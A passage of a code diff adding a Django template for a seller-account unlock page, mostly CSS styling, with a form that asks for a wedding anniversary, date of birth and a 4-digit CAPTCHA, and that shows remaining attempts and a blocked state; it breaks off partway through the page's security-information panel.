@@ -1,0 +1,2780 @@
+{% block content %}
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0"
+    >
+
+    <meta
+        name="robots"
+        content="noindex, nofollow, noarchive"
+    >
+
+    <meta
+        http-equiv="Cache-Control"
+        content="no-store, no-cache, must-revalidate, max-age=0"
+    >
+
+    <meta
+        http-equiv="Pragma"
+        content="no-cache"
+    >
+
+    <meta
+        http-equiv="Expires"
+        content="0"
+    >
+
+    <title>Seller Account Security | Verification</title>
+
+
+    <!-- =========================================================
+         BOOTSTRAP
+    ========================================================== -->
+
+    <link
+        href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
+        rel="stylesheet"
+    >
+
+
+    <!-- =========================================================
+         BOOTSTRAP ICONS
+    ========================================================== -->
+
+    <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css"
+    >
+
+
+    <style>
+
+        /* =========================================================
+           PROFESSIONAL SELLER SECURITY SYSTEM
+        ========================================================== */
+
+        :root {
+
+            --primary: #2563eb;
+            --primary-dark: #1d4ed8;
+            --primary-light: #eff6ff;
+
+            --success: #16a34a;
+            --success-light: #f0fdf4;
+
+            --danger: #dc2626;
+            --danger-light: #fef2f2;
+
+            --warning: #f59e0b;
+            --warning-light: #fffbeb;
+
+            --dark: #0f172a;
+            --dark-2: #1e293b;
+
+            --text: #334155;
+            --muted: #64748b;
+
+            --border: #e2e8f0;
+            --border-light: #edf2f7;
+
+            --background: #f8fafc;
+            --white: #ffffff;
+
+            --radius-xl: 24px;
+            --radius-lg: 17px;
+            --radius-md: 13px;
+            --radius-sm: 10px;
+        }
+
+
+        /* =========================================================
+           GLOBAL
+        ========================================================== */
+
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+        }
+
+
+        html {
+            min-height: 100%;
+            scroll-behavior: smooth;
+        }
+
+
+        body {
+
+            margin: 0;
+
+            min-height: 100vh;
+
+            font-family:
+                Inter,
+                -apple-system,
+                BlinkMacSystemFont,
+                "Segoe UI",
+                Roboto,
+                Arial,
+                sans-serif;
+
+            color: var(--dark);
+
+            background:
+
+                radial-gradient(
+                    circle at 5% 5%,
+                    rgba(37, 99, 235, .12),
+                    transparent 28%
+                ),
+
+                radial-gradient(
+                    circle at 95% 95%,
+                    rgba(22, 163, 74, .08),
+                    transparent 30%
+                ),
+
+                linear-gradient(
+                    135deg,
+                    #f8fafc,
+                    #eef4ff
+                );
+        }
+
+
+        button,
+        input {
+            font-family: inherit;
+        }
+
+
+        /* =========================================================
+           MAIN PAGE
+        ========================================================== */
+
+        .security-page {
+
+            min-height: 100vh;
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+            padding:
+                40px
+                20px
+                70px;
+
+            position: relative;
+
+            overflow: hidden;
+        }
+
+
+        /* =========================================================
+           BACKGROUND DECORATIONS
+        ========================================================== */
+
+        .background-orb {
+
+            position: fixed;
+
+            border-radius: 50%;
+
+            pointer-events: none;
+
+            filter: blur(2px);
+
+            z-index: 0;
+        }
+
+
+        .background-orb-one {
+
+            width: 260px;
+            height: 260px;
+
+            top: -120px;
+            left: -100px;
+
+            background:
+                rgba(37, 99, 235, .07);
+        }
+
+
+        .background-orb-two {
+
+            width: 300px;
+            height: 300px;
+
+            bottom: -150px;
+            right: -110px;
+
+            background:
+                rgba(22, 163, 74, .06);
+        }
+
+
+        /* =========================================================
+           MAIN CARD
+        ========================================================== */
+
+        .security-card {
+
+            width: 100%;
+
+            max-width: 620px;
+
+            position: relative;
+
+            z-index: 2;
+
+            background:
+                rgba(255, 255, 255, .97);
+
+            border:
+                1px solid
+                rgba(226, 232, 240, .95);
+
+            border-radius:
+                var(--radius-xl);
+
+            overflow: hidden;
+
+            box-shadow:
+
+                0 35px 90px
+                rgba(15, 23, 42, .12),
+
+                0 10px 30px
+                rgba(15, 23, 42, .06);
+
+            animation:
+                cardEntrance .55s
+                cubic-bezier(.2,.8,.2,1);
+        }
+
+
+        @keyframes cardEntrance {
+
+            from {
+
+                opacity: 0;
+
+                transform:
+                    translateY(25px)
+                    scale(.97);
+            }
+
+            to {
+
+                opacity: 1;
+
+                transform:
+                    translateY(0)
+                    scale(1);
+            }
+        }
+
+
+        /* =========================================================
+           TOP SECURITY STRIP
+        ========================================================== */
+
+        .security-strip {
+
+            height: 5px;
+
+            background:
+
+                linear-gradient(
+                    90deg,
+                    var(--primary),
+                    #60a5fa,
+                    var(--primary-dark)
+                );
+        }
+
+
+        /* =========================================================
+           HEADER
+        ========================================================== */
+
+        .security-header {
+
+            padding:
+                34px
+                34px
+                30px;
+
+            text-align: center;
+
+            background:
+
+                linear-gradient(
+                    180deg,
+                    #f8fbff,
+                    #ffffff
+                );
+
+            border-bottom:
+                1px solid
+                var(--border-light);
+        }
+
+
+        /* =========================================================
+           SECURITY ICON
+        ========================================================== */
+
+        .security-icon-wrapper {
+
+            width: 82px;
+
+            height: 82px;
+
+            margin:
+                0 auto
+                18px;
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+            position: relative;
+        }
+
+
+        .security-icon {
+
+            width: 72px;
+
+            height: 72px;
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+            border-radius: 50%;
+
+            background:
+
+                linear-gradient(
+                    135deg,
+                    var(--primary),
+                    var(--primary-dark)
+                );
+
+            color: white;
+
+            font-size: 30px;
+
+            box-shadow:
+
+                0 14px 35px
+                rgba(37, 99, 235, .27);
+
+            position: relative;
+
+            z-index: 2;
+        }
+
+
+        .security-icon-ring {
+
+            position: absolute;
+
+            inset: 0;
+
+            border-radius: 50%;
+
+            border:
+                1px solid
+                rgba(37, 99, 235, .16);
+
+            animation:
+                pulseRing 2.4s infinite;
+        }
+
+
+        @keyframes pulseRing {
+
+            0% {
+
+                transform: scale(.82);
+
+                opacity: .8;
+            }
+
+            70% {
+
+                transform: scale(1.08);
+
+                opacity: 0;
+            }
+
+            100% {
+
+                transform: scale(1.08);
+
+                opacity: 0;
+            }
+        }
+
+
+        /* =========================================================
+           SECURITY STATUS
+        ========================================================== */
+
+        .security-status {
+
+            display: inline-flex;
+
+            align-items: center;
+
+            gap: 7px;
+
+            padding:
+                6px
+                11px;
+
+            margin-bottom: 14px;
+
+            border:
+                1px solid
+                #bbf7d0;
+
+            border-radius: 50px;
+
+            background:
+                var(--success-light);
+
+            color:
+                #166534;
+
+            font-size: 11px;
+
+            font-weight: 750;
+
+            letter-spacing: .3px;
+
+            text-transform: uppercase;
+        }
+
+
+        .status-dot {
+
+            width: 7px;
+
+            height: 7px;
+
+            border-radius: 50%;
+
+            background:
+                var(--success);
+
+            box-shadow:
+                0 0 0 4px
+                rgba(22, 163, 74, .10);
+        }
+
+
+        .security-header h1 {
+
+            margin: 0;
+
+            color:
+                var(--dark);
+
+            font-size: 25px;
+
+            font-weight: 800;
+
+            letter-spacing:
+                -.55px;
+        }
+
+
+        .security-header p {
+
+            max-width: 470px;
+
+            margin:
+                10px auto 0;
+
+            color:
+                var(--muted);
+
+            font-size: 14px;
+
+            line-height: 1.65;
+        }
+
+
+        /* =========================================================
+           BODY
+        ========================================================== */
+
+        .security-body {
+
+            padding:
+                30px 34px 34px;
+        }
+
+
+        /* =========================================================
+           MESSAGE
+        ========================================================== */
+
+        .security-message {
+
+            display: flex;
+
+            align-items: flex-start;
+
+            gap: 10px;
+
+            border: 0;
+
+            border-radius:
+                var(--radius-md);
+
+            margin-bottom: 20px;
+
+            padding:
+                13px
+                15px;
+
+            font-size: 13px;
+
+            line-height: 1.5;
+
+            box-shadow:
+                0 3px 10px
+                rgba(15, 23, 42, .04);
+        }
+
+
+        .security-message.alert-success {
+
+            background:
+                #f0fdf4;
+
+            color:
+                #166534;
+        }
+
+
+        .security-message.alert-danger {
+
+            background:
+                #fef2f2;
+
+            color:
+                #991b1b;
+        }
+
+
+        .security-message.alert-warning {
+
+            background:
+                #fffbeb;
+
+            color:
+                #92400e;
+        }
+
+
+        .security-message.alert-info {
+
+            background:
+                #eff6ff;
+
+            color:
+                #1e40af;
+        }
+
+
+        /* =========================================================
+           ACCOUNT INFORMATION
+        ========================================================== */
+
+        .account-panel {
+
+            position: relative;
+
+            display: flex;
+
+            align-items: center;
+
+            gap: 14px;
+
+            padding:
+                17px;
+
+            margin-bottom:
+                24px;
+
+            border:
+                1px solid
+                var(--border);
+
+            border-radius:
+                var(--radius-md);
+
+            background:
+                linear-gradient(
+                    135deg,
+                    #f8fafc,
+                    #ffffff
+                );
+
+            overflow: hidden;
+        }
+
+
+        .account-panel::before {
+
+            content: "";
+
+            position: absolute;
+
+            top: 0;
+            bottom: 0;
+            left: 0;
+
+            width: 4px;
+
+            background:
+                var(--primary);
+        }
+
+
+        .account-icon {
+
+            width: 47px;
+
+            height: 47px;
+
+            flex-shrink: 0;
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+            border-radius:
+                13px;
+
+            background:
+                #dbeafe;
+
+            color:
+                var(--primary);
+
+            font-size: 21px;
+        }
+
+
+        .account-label {
+
+            display: block;
+
+            margin-bottom: 3px;
+
+            color:
+                var(--muted);
+
+            font-size: 10px;
+
+            font-weight: 750;
+
+            text-transform:
+                uppercase;
+
+            letter-spacing:
+                .8px;
+        }
+
+
+        .account-username {
+
+            display: block;
+
+            color:
+                var(--dark);
+
+            font-size: 15px;
+
+            font-weight: 750;
+
+            word-break: break-word;
+        }
+
+
+        .account-status {
+
+            margin-left: auto;
+
+            flex-shrink: 0;
+
+            display: inline-flex;
+
+            align-items: center;
+
+            gap: 6px;
+
+            padding:
+                5px
+                9px;
+
+            border-radius:
+                50px;
+
+            background:
+                #f0fdf4;
+
+            color:
+                #15803d;
+
+            border:
+                1px solid
+                #bbf7d0;
+
+            font-size: 10px;
+
+            font-weight: 700;
+        }
+
+
+        /* =========================================================
+           VERIFICATION PROGRESS
+        ========================================================== */
+
+        .verification-progress {
+
+            margin-bottom:
+                27px;
+        }
+
+
+        .progress-heading {
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content:
+                space-between;
+
+            margin-bottom:
+                9px;
+        }
+
+
+        .progress-title {
+
+            color:
+                var(--dark-2);
+
+            font-size:
+                12px;
+
+            font-weight:
+                700;
+        }
+
+
+        .progress-count {
+
+            color:
+                var(--primary);
+
+            font-size:
+                12px;
+
+            font-weight:
+                750;
+        }
+
+
+        .progress-track {
+
+            width: 100%;
+
+            height: 7px;
+
+            overflow: hidden;
+
+            border-radius:
+                50px;
+
+            background:
+                #e2e8f0;
+        }
+
+
+        .progress-fill {
+
+            height: 100%;
+
+            border-radius:
+                50px;
+
+            background:
+
+                linear-gradient(
+                    90deg,
+                    var(--primary),
+                    #60a5fa
+                );
+
+            transition:
+                width .35s ease;
+        }
+
+
+        /* =========================================================
+           SECTION HEADER
+        ========================================================== */
+
+        .section-heading {
+
+            display: flex;
+
+            align-items: center;
+
+            gap: 10px;
+
+            margin-bottom:
+                20px;
+        }
+
+
+        .section-heading-icon {
+
+            width: 35px;
+
+            height: 35px;
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+            border-radius:
+                10px;
+
+            background:
+                #eff6ff;
+
+            color:
+                var(--primary);
+
+            font-size:
+                16px;
+        }
+
+
+        .section-heading-title {
+
+            color:
+                var(--dark);
+
+            font-size:
+                15px;
+
+            font-weight:
+                800;
+
+            margin: 0;
+        }
+
+
+        .section-heading-subtitle {
+
+            margin:
+                2px 0 0;
+
+            color:
+                var(--muted);
+
+            font-size:
+                11px;
+        }
+
+
+        /* =========================================================
+           FORM GROUP
+        ========================================================== */
+
+        .form-group {
+
+            margin-bottom:
+                19px;
+        }
+
+
+        .form-label {
+
+            display: block;
+
+            margin-bottom:
+                8px;
+
+            color:
+                #334155;
+
+            font-size:
+                12px;
+
+            font-weight:
+                700;
+        }
+
+
+        .input-wrapper {
+
+            position: relative;
+        }
+
+
+        .input-wrapper .input-icon {
+
+            position: absolute;
+
+            left: 15px;
+
+            top: 50%;
+
+            transform:
+                translateY(-50%);
+
+            color:
+                #94a3b8;
+
+            font-size:
+                16px;
+
+            pointer-events:
+                none;
+
+            transition:
+                color .2s ease;
+        }
+
+
+        .input-wrapper:focus-within .input-icon {
+
+            color:
+                var(--primary);
+        }
+
+
+        .form-control {
+
+            width: 100%;
+
+            min-height:
+                50px;
+
+            padding:
+                11px
+                14px
+                11px
+                43px;
+
+            border:
+                1px solid
+                #dbe2ea;
+
+            border-radius:
+                12px;
+
+            background:
+                #ffffff;
+
+            color:
+                var(--dark);
+
+            font-size:
+                14px;
+
+            transition:
+                border-color .2s ease,
+                box-shadow .2s ease,
+                background .2s ease;
+        }
+
+
+        .form-control:hover {
+
+            border-color:
+                #b8c5d5;
+        }
+
+
+        .form-control:focus {
+
+            border-color:
+                var(--primary);
+
+            background:
+                #ffffff;
+
+            box-shadow:
+                0 0 0 4px
+                rgba(37, 99, 235, .10);
+
+            outline:
+                none;
+        }
+
+
+        .form-control::placeholder {
+
+            color:
+                #94a3b8;
+        }
+
+
+        /* =========================================================
+           CAPTCHA BOX
+        ========================================================== */
+
+        .captcha-section {
+
+            position: relative;
+
+            margin-top:
+                8px;
+
+            padding:
+                19px;
+
+            border:
+                1px solid
+                #dbeafe;
+
+            border-radius:
+                var(--radius-md);
+
+            background:
+
+                linear-gradient(
+                    135deg,
+                    #f8fbff,
+                    #eff6ff
+                );
+        }
+
+
+        .captcha-section::before {
+
+            content: "";
+
+            position: absolute;
+
+            left: 0;
+            top: 14px;
+            bottom: 14px;
+
+            width: 3px;
+
+            border-radius:
+                50px;
+
+            background:
+                var(--primary);
+        }
+
+
+        .captcha-heading {
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content:
+                space-between;
+
+            margin-bottom:
+                14px;
+        }
+
+
+        .captcha-title {
+
+            display: flex;
+
+            align-items: center;
+
+            gap: 8px;
+
+            color:
+                var(--dark);
+
+            font-size:
+                13px;
+
+            font-weight:
+                800;
+        }
+
+
+        .captcha-title i {
+
+            color:
+                var(--primary);
+
+            font-size:
+                17px;
+        }
+
+
+        .captcha-badge {
+
+            padding:
+                4px
+                8px;
+
+            border-radius:
+                50px;
+
+            background:
+                #ffffff;
+
+            border:
+                1px solid
+                #bfdbfe;
+
+            color:
+                var(--primary-dark);
+
+            font-size:
+                9px;
+
+            font-weight:
+                800;
+
+            text-transform:
+                uppercase;
+
+            letter-spacing:
+                .4px;
+        }
+
+
+        .captcha-code {
+
+            min-height:
+                70px;
+
+            margin-bottom:
+                14px;
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+            position: relative;
+
+            overflow: hidden;
+
+            border:
+                1px dashed
+                #93c5fd;
+
+            border-radius:
+                12px;
+
+            background:
+
+                repeating-linear-gradient(
+                    -45deg,
+                    #eff6ff,
+                    #eff6ff 9px,
+                    #f8fafc 9px,
+                    #f8fafc 18px
+                );
+
+            color:
+                var(--primary-dark);
+
+            font-size:
+                30px;
+
+            font-weight:
+                900;
+
+            letter-spacing:
+                10px;
+
+            user-select:
+                none;
+
+            text-shadow:
+                1px 2px 0
+                rgba(37,99,235,.10);
+        }
+
+
+        .captcha-code::before,
+        .captcha-code::after {
+
+            content: "";
+
+            position: absolute;
+
+            width: 120%;
+
+            height: 1px;
+
+            background:
+                rgba(37,99,235,.18);
+
+            transform:
+                rotate(-8deg);
+        }
+
+
+        .captcha-code::after {
+
+            transform:
+                rotate(8deg);
+        }
+
+
+        .captcha-label {
+
+            margin-bottom:
+                7px;
+
+            color:
+                #334155;
+
+            font-size:
+                11px;
+
+            font-weight:
+                700;
+        }
+
+
+        .captcha-help {
+
+            display: flex;
+
+            align-items:
+                flex-start;
+
+            gap: 5px;
+
+            margin-top:
+                8px;
+
+            color:
+                var(--muted);
+
+            font-size:
+                10px;
+
+            line-height:
+                1.55;
+        }
+
+
+        .captcha-help i {
+
+            color:
+                var(--primary);
+
+            margin-top:
+                1px;
+        }
+
+
+        /* =========================================================
+           VERIFY BUTTON
+        ========================================================== */
+
+        .verify-btn {
+
+            width:
+                100%;
+
+            min-height:
+                54px;
+
+            margin-top:
+                22px;
+
+            display:
+                flex;
+
+            align-items:
+                center;
+
+            justify-content:
+                center;
+
+            gap:
+                9px;
+
+            border:
+                0;
+
+            border-radius:
+                13px;
+
+            background:
+
+                linear-gradient(
+                    135deg,
+                    var(--primary),
+                    var(--primary-dark)
+                );
+
+            color:
+                #ffffff;
+
+            font-size:
+                14px;
+
+            font-weight:
+                800;
+
+            letter-spacing:
+                .1px;
+
+            box-shadow:
+
+                0 10px 25px
+                rgba(37,99,235,.20);
+
+            transition:
+                transform .2s ease,
+                box-shadow .2s ease,
+                filter .2s ease;
+        }
+
+
+        .verify-btn:hover {
+
+            color:
+                #ffffff;
+
+            transform:
+                translateY(-2px);
+
+            filter:
+                brightness(1.03);
+
+            box-shadow:
+
+                0 15px 32px
+                rgba(37,99,235,.28);
+        }
+
+
+        .verify-btn:active {
+
+            transform:
+                translateY(0);
+
+            box-shadow:
+                0 8px 18px
+                rgba(37,99,235,.20);
+        }
+
+
+        .verify-btn:disabled {
+
+            opacity:
+                .72;
+
+            cursor:
+                not-allowed;
+
+            transform:
+                none;
+
+            filter:
+                none;
+        }
+
+
+        /* =========================================================
+           SECURITY INFORMATION
+        ========================================================== */
+
+        .security-info {
+
+            display:
+                grid;
+
+            grid-template-columns:
+                1fr 1fr;
+
+            gap:
+                10px;
+
+            margin-top:
+                22px;
+        }
+
+
+        .info-item {
+
+            display:
+                flex;
+
+            align-items:
+                flex-start;
+
+            gap:
+                9px;
+
+            padding:
+                12px;
+
+            border:
+                1px solid
+                var(--border-light);
+
+            border-radius:
+                11px;
+
+            background:
+                #fafcff;
+        }
+
+
+        .info-icon {
+
+            color:
+                var(--success);
+
+            font-size:
+                16px;
+
+            flex-shrink:
+                0;
+        }
+
+
+        .info-item strong {
+
+            display:
+                block;
+
+            color:
+                var(--dark-2);
+
+            font-size:
+                10px;
+
+            font-weight:
+                800;
+        }
+
+
+        .info-item span {
+
+            display:
+                block;
+
+            margin-top:
+                2px;
+
+            color:
+                var(--muted);
+
+            font-size:
+                9px;
+
+            line-height:
+                1.45;
+        }
+
+
+        /* =========================================================
+           BLOCKED BOX
+        ========================================================== */
+
+        .blocked-box {
+
+            padding:
+                30px 22px;
+
+            text-align:
+                center;
+
+            border:
+                1px solid
+                #fecaca;
+
+            border-radius:
+                var(--radius-lg);
+
+            background:
+
+                linear-gradient(
+                    135deg,
+                    #fef2f2,
+                    #fff7f7
+                );
+        }
+
+
+        .blocked-icon {
+
+            width:
+                66px;
+
+            height:
+                66px;
+
+            margin:
+                0 auto 16px;
+
+            display:
+                flex;
+
+            align-items:
+                center;
+
+            justify-content:
+                center;
+
+            border-radius:
+                50%;
+
+            background:
+                #fee2e2;
+
+            color:
+                var(--danger);
+
+            font-size:
+                28px;
+
+            box-shadow:
+                0 8px 20px
+                rgba(220,38,38,.10);
+        }
+
+
+        .blocked-title {
+
+            margin-bottom:
+                7px;
+
+            color:
+                #991b1b;
+
+            font-size:
+                17px;
+
+            font-weight:
+                800;
+        }
+
+
+        .blocked-text {
+
+            margin:
+                0;
+
+            color:
+                #7f1d1d;
+
+            font-size:
+                12px;
+
+            line-height:
+                1.65;
+        }
+
+
+        /* =========================================================
+           FOOTER
+        ========================================================== */
+
+        .security-footer {
+
+            display:
+                flex;
+
+            align-items:
+                center;
+
+            justify-content:
+                center;
+
+            gap:
+                7px;
+
+            margin-top:
+                25px;
+
+            padding-top:
+                19px;
+
+            border-top:
+                1px solid
+                var(--border-light);
+
+            color:
+                var(--muted);
+
+            font-size:
+                10px;
+
+            text-align:
+                center;
+        }
+
+
+        .security-footer i {
+
+            color:
+                var(--success);
+
+            font-size:
+                13px;
+        }
+
+
+        /* =========================================================
+           AUTOFILL PROTECTION
+        ========================================================== */
+
+        input:-webkit-autofill,
+        input:-webkit-autofill:hover,
+        input:-webkit-autofill:focus {
+
+            -webkit-text-fill-color:
+                var(--dark);
+
+            transition:
+                background-color
+                9999s
+                ease-out;
+
+            box-shadow:
+                0 0 0 1000px
+                #ffffff
+                inset;
+        }
+
+
+        /* =========================================================
+           RESPONSIVE
+        ========================================================== */
+
+        @media (max-width: 576px) {
+
+            .security-page {
+
+                padding:
+                    20px
+                    11px
+                    45px;
+            }
+
+
+            .security-card {
+
+                border-radius:
+                    18px;
+            }
+
+
+            .security-header {
+
+                padding:
+                    28px
+                    20px
+                    25px;
+            }
+
+
+            .security-body {
+
+                padding:
+                    23px
+                    19px
+                    25px;
+            }
+
+
+            .security-header h1 {
+
+                font-size:
+                    21px;
+            }
+
+
+            .security-header p {
+
+                font-size:
+                    12px;
+            }
+
+
+            .security-icon {
+
+                width:
+                    64px;
+
+                height:
+                    64px;
+
+                font-size:
+                    26px;
+            }
+
+
+            .security-icon-wrapper {
+
+                width:
+                    74px;
+
+                height:
+                    74px;
+            }
+
+
+            .account-panel {
+
+                padding:
+                    14px;
+            }
+
+
+            .account-status {
+
+                display:
+                    none;
+            }
+
+
+            .captcha-code {
+
+                min-height:
+                    62px;
+
+                font-size:
+                    24px;
+
+                letter-spacing:
+                    7px;
+            }
+
+
+            .security-info {
+
+                grid-template-columns:
+                    1fr;
+            }
+
+
+            .verify-btn {
+
+                min-height:
+                    52px;
+            }
+        }
+
+
+        @media (max-width: 380px) {
+
+            .security-body {
+
+                padding:
+                    20px
+                    15px
+                    23px;
+            }
+
+
+            .captcha-section {
+
+                padding:
+                    15px;
+            }
+
+
+            .captcha-code {
+
+                font-size:
+                    21px;
+
+                letter-spacing:
+                    5px;
+            }
+        }
+
+    </style>
+
+</head>
+
+
+<body>
+
+
+<!-- =========================================================
+     BACKGROUND
+========================================================== -->
+
+<div class="background-orb background-orb-one"></div>
+
+<div class="background-orb background-orb-two"></div>
+
+
+<!-- =========================================================
+     MAIN PAGE
+========================================================== -->
+
+<div class="security-page">
+
+
+    <!-- =====================================================
+         SECURITY CARD
+    ====================================================== -->
+
+    <div class="security-card">
+
+
+        <!-- =================================================
+             SECURITY STRIP
+        ================================================== -->
+
+        <div class="security-strip"></div>
+
+
+        <!-- =================================================
+             HEADER
+        ================================================== -->
+
+        <div class="security-header">
+
+
+            <div class="security-icon-wrapper">
+
+                <div class="security-icon-ring"></div>
+
+                <div class="security-icon">
+
+                    <i class="bi bi-shield-lock-fill"></i>
+
+                </div>
+
+            </div>
+
+
+            <div class="security-status">
+
+                <span class="status-dot"></span>
+
+                Secure Verification
+
+            </div>
+
+
+            <h1>
+                Account Security Verification
+            </h1>
+
+
+            <p>
+
+                Verify your registered security information
+                to safely continue with your seller account
+                unlock request.
+
+            </p>
+
+
+        </div>
+
+
+        <!-- =================================================
+             BODY
+        ================================================== -->
+
+        <div class="security-body">
+
+
+            <!-- =================================================
+                 DJANGO MESSAGES
+            ================================================== -->
+
+            {% if messages %}
+
+                {% for message in messages %}
+
+                    <div
+                        class="alert alert-{{ message.tags|default:'info' }} security-message"
+                        role="alert"
+                    >
+
+                        {% if message.tags == "success" %}
+
+                            <i class="bi bi-check-circle-fill"></i>
+
+                        {% elif message.tags == "error" or message.tags == "danger" %}
+
+                            <i class="bi bi-exclamation-triangle-fill"></i>
+
+                        {% elif message.tags == "warning" %}
+
+                            <i class="bi bi-exclamation-circle-fill"></i>
+
+                        {% else %}
+
+                            <i class="bi bi-info-circle-fill"></i>
+
+                        {% endif %}
+
+                        <span>
+                            {{ message }}
+                        </span>
+
+                    </div>
+
+                {% endfor %}
+
+            {% endif %}
+
+
+            <!-- =================================================
+                 SELLER ACCOUNT
+            ================================================== -->
+
+            <div class="account-panel">
+
+
+                <div class="account-icon">
+
+                    <i class="bi bi-person-badge-fill"></i>
+
+                </div>
+
+
+                <div>
+
+                    <span class="account-label">
+                        Seller Account
+                    </span>
+
+                    <span class="account-username">
+                        {{ username }}
+                    </span>
+
+                </div>
+
+
+                <div class="account-status">
+
+                    <i class="bi bi-check-circle-fill"></i>
+
+                    Verified Account
+
+                </div>
+
+
+            </div>
+
+
+            {% if blocked %}
+
+
+                <!-- =============================================
+                     BLOCKED STATE
+                ============================================== -->
+
+                <div class="blocked-box">
+
+
+                    <div class="blocked-icon">
+
+                        <i class="bi bi-shield-x"></i>
+
+                    </div>
+
+
+                    <div class="blocked-title">
+
+                        Verification Temporarily Blocked
+
+                    </div>
+
+
+                    <p class="blocked-text">
+
+                        The maximum number of verification attempts
+                        has been reached.
+
+                        <br>
+
+                        For your account security, further verification
+                        attempts are temporarily unavailable.
+
+                        <br><br>
+
+                        Please contact the administrator for assistance.
+
+                    </p>
+
+
+                </div>
+
+
+            {% else %}
+
+
+                <!-- =============================================
+                     VERIFICATION PROGRESS
+                ============================================== -->
+
+                <div class="verification-progress">
+
+
+                    <div class="progress-heading">
+
+                        <span class="progress-title">
+
+                            Verification Attempts
+
+                        </span>
+
+
+                        <span class="progress-count">
+
+                            {{ remaining }} remaining
+
+                        </span>
+
+                    </div>
+
+
+                    <div class="progress-track">
+
+                        <div
+                            class="progress-fill"
+                            style="width: {% widthratio remaining 5 100 %}%;"
+                        ></div>
+
+                    </div>
+
+                </div>
+
+
+                <!-- =============================================
+                     FORM
+                ============================================== -->
+
+                <form
+                    method="POST"
+                    id="securityForm"
+                    autocomplete="off"
+                    novalidate
+                    data-lpignore="true"
+                    data-1p-ignore="true"
+                    data-bwignore="true"
+                >
+
+                    {% csrf_token %}
+
+
+                    <!-- =========================================
+                         FORM SECTION HEADER
+                    ========================================== -->
+
+                    <div class="section-heading">
+
+
+                        <div class="section-heading-icon">
+
+                            <i class="bi bi-person-check-fill"></i>
+
+                        </div>
+
+
+                        <div>
+
+                            <h2 class="section-heading-title">
+
+                                Confirm Security Information
+
+                            </h2>
+
+
+                            <p class="section-heading-subtitle">
+
+                                Enter the information associated
+                                with your seller account.
+
+                            </p>
+
+                        </div>
+
+
+                    </div>
+
+
+                    <!-- =========================================
+                         WEDDING ANNIVERSARY
+                    ========================================== -->
+
+                    <div class="form-group">
+
+
+                        <label
+                            for="wedding"
+                            class="form-label"
+                        >
+
+                            <i class="bi bi-calendar-heart me-1"></i>
+
+                            Wedding Anniversary
+
+                        </label>
+
+
+                        <div class="input-wrapper">
+
+
+                            <i
+                                class="bi bi-calendar-heart input-icon"
+                            ></i>
+
+
+                            <input
+                                type="date"
+                                name="wedding"
+                                id="wedding"
+                                class="form-control"
+                                required
+                                autocomplete="off"
+                                data-lpignore="true"
+                                data-1p-ignore="true"
+                                data-bwignore="true"
+                                spellcheck="false"
+                                autocorrect="off"
+                                autocapitalize="none"
+                            >
+
+
+                        </div>
+
+                    </div>
+
+
+                    <!-- =========================================
+                         DATE OF BIRTH
+                    ========================================== -->
+
+                    <div class="form-group">
+
+
+                        <label
+                            for="dob"
+                            class="form-label"
+                        >
+
+                            <i class="bi bi-calendar3 me-1"></i>
+
+                            Date of Birth
+
+                        </label>
+
+
+                        <div class="input-wrapper">
+
+
+                            <i
+                                class="bi bi-calendar3 input-icon"
+                            ></i>
+
+
+                            <input
+                                type="date"
+                                name="dob"
+                                id="dob"
+                                class="form-control"
+                                required
+                                autocomplete="off"
+                                data-lpignore="true"
+                                data-1p-ignore="true"
+                                data-bwignore="true"
+                                spellcheck="false"
+                                autocorrect="off"
+                                autocapitalize="none"
+                            >
+
+
+                        </div>
+
+                    </div>
+
+
+                    <!-- =========================================
+                         CAPTCHA
+                    ========================================== -->
+
+                    <div class="captcha-section">
+
+
+                        <div class="captcha-heading">
+
+
+                            <div class="captcha-title">
+
+                                <i class="bi bi-shield-check"></i>
+
+                                CAPTCHA Verification
+
+                            </div>
+
+
+                            <span class="captcha-badge">
+
+                                Security Check
+
+                            </span>
+
+
+                        </div>
+
+
+                        <!-- CAPTCHA DISPLAY -->
+
+                        <div class="captcha-code">
+
+                            {{ captcha }}
+
+                        </div>
+
+
+                        <!-- CAPTCHA INPUT LABEL -->
+
+                        <label
+                            for="captcha"
+                            class="captcha-label"
+                        >
+
+                            Enter the 4-digit security code
+
+                        </label>
+
+
+                        <!-- CAPTCHA INPUT -->
+
+                        <div class="input-wrapper">
+
+
+                            <i
+                                class="bi bi-key-fill input-icon"
+                            ></i>
+
+
+                            <input
+                                type="text"
+                                name="captcha"
+                                id="captcha"
+                                class="form-control"
+                                inputmode="numeric"
+                                pattern="[0-9]{4}"
+                                maxlength="4"
+                                minlength="4"
+                                autocomplete="off"
+                                spellcheck="false"
+                                autocorrect="off"
+                                autocapitalize="none"
+                                data-lpignore="true"
+                                data-1p-ignore="true"
+                                data-bwignore="true"
+                                required
+                            >
+
+
+                        </div>
+
+
+                        <div class="captcha-help">
+
+                            <i class="bi bi-info-circle"></i>
+
+                            <span>
+
+                                Enter all 4 digits exactly as displayed.
+                                A new CAPTCHA is generated after an
+                                unsuccessful verification attempt.
+
+                            </span>
+
+                        </div>
+
+
+                    </div>
+
+
+                    <!-- =========================================
+                         VERIFY BUTTON
+                    ========================================== -->
+
+                    <button
+                        type="submit"
+                        class="verify-btn"
+                        id="verifyButton"
+                    >
+
+                        <i
+                            class="bi bi-shield-lock-fill"
+                            id="verifyIcon"
+                        ></i>
+
+
+                        <span id="verifyText">
+
+                            Verify & Continue
+
+                        </span>
+
+                    </button>
+
+
+                </form>
+
+
+                <!-- =============================================
+                     SECURITY INFORMATION
+                ============================================== -->
+
+                <div class="security-info">
+
+
+                    <div class="info-item">
+
+                        <i
+                            class="bi bi-lock-fill info-icon"
+                        ></i>
+
+                        <div>
+
+                            <strong>
+                                Protected Verification
+                            </strong>
+
+                            <span>
+                                Your security information is
+                                processed securely.
